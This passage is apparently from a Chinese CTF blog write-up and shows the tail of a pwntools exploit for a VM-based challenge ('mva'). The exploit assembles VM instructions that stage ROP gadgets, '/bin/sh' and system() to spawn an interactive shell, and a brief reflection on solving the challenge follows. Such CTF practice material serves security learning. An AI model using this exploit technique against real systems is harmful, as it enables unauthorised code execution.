class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)</span><br><span class="line">		</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(pop_rdi1)</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(pop_rdi2)</span><br><span class="line"></span><br><span class="line">		payload += ldr(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x10</span>) + ldr(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">3</span>,<span class="number">0x80</span>,<span class="number">0</span>) </span><br><span class="line">		payload += mv(<span class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)	</span><br><span class="line">		</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(binsh1)</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(binsh2)</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(binsh3)</span><br><span class="line"></span><br><span class="line">		payload += ldr(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x14</span>) + ldr(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">3</span>,<span class="number">0x80</span>,<span class="number">0</span>) </span><br><span class="line">		payload += mv(<span class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)	</span><br><span class="line">				</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(ret1)</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(ret2)</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(ret3)			</span><br><span class="line">		</span><br><span class="line">		payload += ldr(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x18</span>) + ldr(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">3</span>,<span class="number">0x80</span>,<span class="number">0</span>) </span><br><span class="line">		payload += mv(<span class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)	</span><br><span class="line">					</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(system1)</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(system2)</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(system3)</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">		payload += p32(<span class="number">0x8</span>) + p32(<span class="number">0xE4000000</span>)</span><br><span class="line">		payload = payload.ljust(<span class="number">0x38</span>*<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">		</span><br><span class="line">		payload += p32(<span class="number">8</span>) + p32(<span class="number">0</span>)</span><br><span class="line">		payload = payload.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">		payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">#gdb.attach(p)</span></span><br><span class="line">		</span><br><span class="line">		p.send(payload)	</span><br><span class="line">		p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结</strong></p>
<p>这道题差点让我离开人世，我一共复现了3天，第1天连“跳转表”都不会改，被乱七八糟的代码搞崩了心态，第2天又被复杂的算法血虐，凌晨的时候才打出了两个leak，第3天直接调试到吐</p>
<p>官方的exp我调不通（因为环境不一样），这大大阻碍了我的理解，最后慢慢理解程序的代码和exp的用意，不断调整exp进行试错，还是调出来了（虽然是对着wp调的）</p>
<p>这是我第一次搞 VMP pwn，算是长见识了……</p>

    </div>

    
    
    

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/canary/" rel="tag"><i class="fa fa-tag"></i> canary</a>
              <a href="/tags/fmt/" rel="tag"><i class="fa fa-tag"></i> fmt</a>
              <a href="/tags/golang-pwn/" rel="tag"><i class="fa fa-tag"></i> golang pwn</a>
              <a href="/tags/VMP-pwn/" rel="tag"><i class="fa fa-tag"></i> VMP pwn</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/03/21/kernel%20environ/" rel="prev" title="kernel environ">
      <i class="fa fa-chevron-left"></i> kernel environ
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/03/27/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ALargebin%20Attack/" rel="next" title="Ptmalloc算法：Largebin Attack">
      Ptmalloc算法：Largebin Attack <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#gogogo"><span class="nav-number">1.</span> <span class="nav-text">gogogo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babygame"><span class="nav-number">2.</span> <span class="nav-text">babygame</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mva"><span class="nav-number">3.</span> <span class="nav-text">mva</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">189</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">116</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">2.5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">37:14</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
